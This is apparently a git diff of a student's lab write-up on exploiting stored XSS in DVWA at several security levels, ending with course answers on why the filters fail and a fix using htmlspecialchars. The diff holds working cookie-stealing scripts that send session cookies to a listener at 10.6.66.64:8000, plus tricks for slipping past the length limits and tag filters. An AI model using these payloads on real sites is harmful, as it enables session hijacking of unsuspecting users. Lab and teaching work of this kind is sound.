@@ -163,36 +163,9 @@ $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . (
 
 This means we should be able to enter our payload from the previous section as either the name or message, and it should execute whenever the page is loaded, since all comments are displayed. One issue is that the text fields on the page only allow a fixed number of characters. One way around this is to send the post requests ourselves. We can encode our payload in url (using [this website](https://meyerweb.com/eric/tools/dencoder/)), and send the request.
 
-Unfortunately, I ran into an issue. Even if we send the POST requests ourselves, there still seems to be some kind of maximum size we can send (after some testing the largest POST request I was able to send had a content length of 522). This is really unfortunate as by default my payload was slightly longer than that. I was able to get the following payloads to work (after url encoding them and putting them in my post request):
+Unfortunately, I ran into an issue. Even if we send the POST requests ourselves, there still seems to be some kind of maximum size we can send. After <del>so many hours :(</del> some testing, I finally determined the cause: the SQL database limits the sizes of the name and message. The name field is restricted to 100 characters and the message field is restricted to 300 characters. This means that any payloads  we send need to be <300 characters if we're injecting message, and <100 if we're injecting name. With this in mind, the following minified script works for (after being url encoded and sent in the message field):
 ```html
-<script>
-function getCookie(name) {
-  const value = `; ${document.cookie}`;
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop().split(';').shift();
-}
-alert(getCookie("PHPSESSID"));
-</script>
-```
-
-```html
-<script>
-var msg = new XMLHttpRequest();
-var url = "http://10.6.66.64:8000";
-var params = "?cookies=";
-msg.open("GET", url+params+document.cookie, async=false);
-msg.send();
-</script>
-```
-
-However, combining them didn't work. I tried minifying my code by removing whitespace, like in the following payload. This was under the 522 length limit, but didn't work:
-```html
-<script>var msg= new XMLHttpRequest();var url="http://10.6.66.64:8000";function getCookie(name) {var value=`; ${document.cookie}`;var parts= value.split(`; ${name}=`);if (parts.length === 2) return parts.pop().split(';').shift();}msg.open("GET",url+"?PHPSESSID="+getCookie("PHPSESSID"),async=false);msg.send();</script>
-```
-
-For the remainder of these labs, I'll use the following payload, which simply sends all cookies to our fake web server.
-```html
-<script>var msg = new XMLHttpRequest();var url = 'http://10.6.66.64:8000';var params = '?cookies=';msg.open('GET', url+params+document.cookie, async=false);msg.send();</script>
+<script>var m=new XMLHttpRequest();var url="http://10.6.66.64:8000";function gC(name){var value=`; ${document.cookie}`;var p=value.split(`; ${name}=`);if (p.length===2){return p.pop().split(';').shift();}}m.open("GET",url+"?PHPSESSID="+gC("PHPSESSID"),async=false);m.send();</script>
 ```
 
 *Security Level: medium*
@@ -205,7 +178,45 @@ The `strip_tags` function basically prevents any HTML injections. Luckily, the n
 ```PHP
 $name = str_replace( '<script>', '', $name );
 ```
-This is the same as the *medium* level for the previous vulnerability, so any similar payload can work. Note that now the `name` field is the vulnerable one, so this is the field where we need to insert our payload instead of message. However, the maximum number of characters seems to be even smaller than for the message, so we can't use our previous payload.
+This is the same as the *medium* level for the previous vulnerability, so any similar payload can work. Note that now the `name` field is the vulnerable one, so this is the field where we need to insert our payload instead of message, which means we have only 100 characters to form a payload. Unfortunately, this means that even our simplest way to contact the server (120 chars) is too big. However, there is a way around this. If we look at the way guestbook logs are displayed on the webpage, they are placed in a div as follows:
+```HTML
+Name: test
+<br>
+Message: This is a test comment.
+<br>
+```
+We can actually use both the `name` and `message` fields. Since name appears before message, we can start our payload in `name`, where there is weaker sanitization, and continue it in `message`. To do this we can add `/*` to the end of our `name` payload, and `*/` to the start of our `message` payload, as this will comment out anything in-between the 2. For example, given our previous payload of <300 chars, we can split it as follows:
+```html
+<body onload="var m=new XMLHttpRequest();/*
+
+*/m.open('GET','http://10.6.66.64:8000?'+document.cookie,async=false);m.send();">
+```
+Unfortunately, this doesn't work due to the `"` being escaped by `addslashes`. There is another way of dealing with this character limit, although it also imposes limitations:
+```
+<img id='
+
+' src=1 onerror=alert(1) //
+```
+This essentially captures what's between the `name` and `message` as part of a benign field of the html element, takes advantage of the weaker sanitization in the name field, and allows us to write a longer payload in the body:
+```html
+Name:
+<img id="<br />Message: \" src="1" onerror="alert(1)" <br="">
+```
+However, we do have some limitations: we can't use single or double-quotes because of `addslashes`, but we can use backtick (\`), which work as template literals (formatted strings) in javascript. We also cannot write spaces in our code as we can't wrap the onerror code in quotes, so our javascript needs to be 1 uninterrupted block to be parsed together. This doesn't work with our current method of using `XMLHttpRequest`, but we can instead use the following to contact our server:
+```javascript
+fetch(`http://10.6.66.64:8000?${document.cookie}`);
+```
+This also greatly reduced the length of our code, so it is possible to send the entire payload in the `name` field.
+```
+<img id='
+
+' src=1 onerror=fetch(`http://10.6.66.64:8000?PHPSESSID=${document.cookie.split(`; PHPSESSID=`).pop().split(`;`).shift()}`); //
+```
+This javascript payload works in on online emulated javascript environment, but doesn't work when it's used as a payload for dvwa. At this point, I can't be fucked to try and make it work and I've wasted enough time on this bullshit. The following payload in the `name` field works:
+```html
+<body onload=fetch(`http://10.6.66.64:8000?${document.cookie}`);>
+
+```
 
 *Security Level: high*
 
@@ -213,4 +224,15 @@ This level again reflects the previous category, with the same regex used to san
 ```PHP
 $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
 ```
-We can exploit this by using events to trigger javascript instead. An even larger list to the one I wrote previously can be found [**here**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
+We can exploit this by using events to trigger javascript instead. An even larger list to the one I wrote previously can be found [**here**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). We can employ the same method used for the previous level to perform the XSS.
+
+### Questions
+1. In the **reflected** category, the following protections are in place:
+  - *Medium level:* All occurences of the string `<script>` are stripped from the `name` URL query string parameter before it is inserted into the HTML.
+  - *High level:* Any string matching the regex `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i` are stripped from the `name` parameter.
+  Neither are effective because there are ways of triggering script eexecution on a page that don't involve the use of `<script>` elements.
+
+  In the **stored** category, the `message` parameter in the POST form data is insufficiently sanitised in the *low* security level, but correctly sanitised in the higher security level. The `name` parameter isn't correctly sanitised in any security level (with the same attempts as the previous category).
+
+2. In both categories, in all security levels, the solution is the same: all user-supplied input, whether
+read from the URL query string or the database, should be appropriately sanitised with PHP’s built in `htmlspecialchars()` function (ideally using ENT_QUOTES as the second parameter) before being inserted into the HTML. Otherwise `strip_tags( addslashes( $message ) ); ` seems to work very well.
